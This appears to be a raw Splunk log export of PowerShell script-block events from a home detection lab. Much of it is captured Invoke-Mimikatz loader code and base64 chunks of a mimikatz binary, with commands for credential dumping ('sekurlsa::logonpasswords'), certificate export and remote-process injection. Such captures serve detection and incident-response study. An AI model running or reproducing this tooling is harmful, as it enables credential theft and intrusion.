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
+79490727-fa2f-46e6-bf60-bef62708dfb5","2025-11-23T14:38:46.648+0000",,,Execute,,"DESKTOP-78CU07R","DESKTOP-78CU07R",,227,"endpoint_services_processes windows_event_signature windows_ta_data","DESKTOP-78CU07R",227,"mydfir-project",,27,,,,,,,"//_::._=--/===-==-------==--====___=__=________.__",,,,,,,,,,,,medium,3,,,4104,,,,,,,"Microsoft-Windows-PowerShell/Operational",WinEventLog,,"chalitha-splunk",,,,,,"track_event_signatures",,"track_event_signatures",,,,,,"Microsoft Windows",
+,,,,,,"DESKTOP-78CU07R",,Continue,,,,,,,,4104,3,"sekurlsa::logonpasswords exit",,,,,,,,,,,None,"Microsoft-Windows-PowerShell/Operational",,,,Splunk,,,On,"[System.Runtime.InteropServices.Marshal]","$WStringFunc.Invoke($WStringInput)",,"[Byte[]]","'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","[IntPtr]","Get-PEDetailedInfo","Invoke-MemoryLoadLibrary",,,,,,"$Processors[0]","Get-WmiObject",,"Invoke-CreateRemoteThread",117,"$PELoadedInfo[1]","$Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)",,,,,,"S-1-5-21-1697325460-2044954953-441488130-1001",0,"Microsoft-Windows-PowerShell",,"$Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)",Execute,,Warning,,"NOT_TRANSLATED","Get-MemoryProcAddress","[System.Runtime.InteropServices.Marshal]","Get-MemoryProcAddress","Get-DelegateType","[System.Runtime.InteropServices.Marshal]",,,,"11/23/2025 08:38:46.646 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+EventCode=4104
+EventType=3
+ComputerName=DESKTOP-78CU07R
+User=NOT_TRANSLATED
+Sid=S-1-5-21-1697325460-2044954953-441488130-1001
+SidType=0
+SourceName=Microsoft-Windows-PowerShell
+Type=Warning
+RecordNumber=117
+Keywords=None
+TaskCategory=Execute a Remote Command
+OpCode=On create calls
+Message=Splunk could not get the description for this event. Either the component that raises this event is not installed on your local computer or the installation is corrupt.
+
+FormatMessage error:
+
+Got the following information from this event: 
+
+d -ne $null) -and ($ProcId -ne 0))
+		{
+			$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
+			if ($RemoteProcHandle -eq [IntPtr]::Zero)
+			{
+				Throw ""Couldn't obtain the handle for process ID: $ProcId""
+			}
+			
+			Write-Verbose ""Got the handle for the remote process to inject in to""
+		}
+		
+
+		#Load the PE reflectively
+		Write-Verbose ""Calling Invoke-MemoryLoadLibrary""
+
+        try
+        {
+            $Processors = Get-WmiObject -Class Win32_Processor
+        }
+        catch
+        {
+            throw ($_.Exception)
+        }
+
+        if ($Processors -is [array])
+        {
+            $Processor = $Processors[0]
+        } else {
+            $Processor = $Processors
+        }
+
+        if ( ( $Processor.AddressWidth) -ne (([System.IntPtr]::Size)*8) )
+        {
+            Write-Verbose ( ""Architecture: "" + $Processor.AddressWidth + "" Process: "" + ([System.IntPtr]::Size * 8))
+            Write-Error ""PowerShell architecture (32bit/64bit) doesn't match OS architecture. 64bit PS must be used on a 64bit OS."" -ErrorAction Stop
+        }
+
+        #Determine whether or not to use 32bit or 64bit bytes
+        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
+        {
+            [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes64)
+        }
+        else
+        {
+            [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes32)
+        }
+        $PEBytes[0] = 0
+        $PEBytes[1] = 0
+		$PEHandle = [IntPtr]::Zero
+		if ($RemoteProcHandle -eq [IntPtr]::Zero)
+		{
+			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs
+		}
+		else
+		{
+			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle
+		}
+		if ($PELoadedInfo -eq [IntPtr]::Zero)
+		{
+			Throw ""Unable to load PE, handle returned is NULL""
+		}
+		
+		$PEHandle = $PELoadedInfo[0]
+		$RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
+		
+		
+		#Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
+		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
+		if (($PEInfo.FileType -ieq ""DLL"") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
+		{
+			#########################################
+			### YOUR CODE GOES HERE
+			#########################################
+                    Write-Verbose ""Calling function with WString return type""
+				    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName ""powershell_reflective_mimikatz""
+				    if ($WStringFuncAddr -eq [IntPtr]::Zero)
+				    {
+					    Throw ""Couldn't find function address.""
+				    }
+				    $WStringFuncDelegate = Get-DelegateType @([IntPtr]) ([IntPtr])
+				    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
+                    $WStringInput = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArgs)
+				    [IntPtr]$OutputPtr = $WStringFunc.Invoke($WStringInput)
+                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($WStringInput)
+				    if ($OutputPtr -eq [IntPtr]::Zero)
+				    {
+				    	Throw ""Unable to get output, Output Ptr is NULL""
+				    }
+				    else
+				    {
+				        $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
+				        Write-Output $Output
+				        $Win32Functions.LocalFree.Invoke($OutputPtr);
+				    }
+			#########################################
+			### END OF YOUR CODE
+			#########################################
+		}
+		#For remote DLL injection, call a void function which takes no parameters
+		elseif (($PEInfo.FileType -ieq ""DLL"") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
+		{
+			$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName ""VoidFunc""
+			if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
+			{
+				Throw ""VoidFunc couldn't be found in the DLL""
+			}
+			
+			$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
+			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
+			
+			#Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
+			$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
+		}
+		
+		#Don't free a library if it is injected in a remote process
+		if ($RemoteProcHandle -eq [IntPtr]::Zero)
+		{
+			Invoke-MemoryFreeLibrary -PEHandle $PEHandle
+		}
+		else
+		{
+			#Just delete the memory allocated in PowerShell to build the PE before injecting to remote process
+			$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
+			if ($Success -eq $false)
+			{
+				Write-Warning ""Unable to call VirtualFree on the PE's memory. Continuing anyways."" -WarningAction Continue
+			}
+		}
+		
+		Write-Verbose ""Done!""
+	}
+
+	Main
+}
+
+#Main function to either run the script locally or remotely
+Function Main
+{
+	if (($PSCmdlet.MyInvocation.BoundParameters[""Debug""] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters[""Debug""].IsPresent)
+	{
+		$DebugPreference  = ""Continue""
+	}
+	
+	Write-Verbose ""PowerShell ProcessID: $PID""
+	
+
+	if ($PsCmdlet.ParameterSetName -ieq ""DumpCreds"")
+	{
+		$ExeArgs = ""sekurlsa::logonpasswords exit""
+	}
+    elseif ($PsCmdlet.ParameterSetName -ieq ""DumpCerts"")
+    {
+        $ExeArgs = ""crypto::cng crypto::capi `""crypto::certificates /export`"" `""crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE`"" exit""
+    }
+    else
+    {
+        $ExeArgs = $Command
+    }
+
+    [System.IO.Directory]::SetCurrentDirectory($pwd)
+
+    # mimikatz 2.2.0 (x64) #18362
+    # SHA256 hash: E4B762ECA32A797E305C9949504B95C4CDCF68FC8EEE0B3C101842488AF27D4F
+    # VirusTotal Analysis: no signature yet ;)
+    $PEBytes64 = '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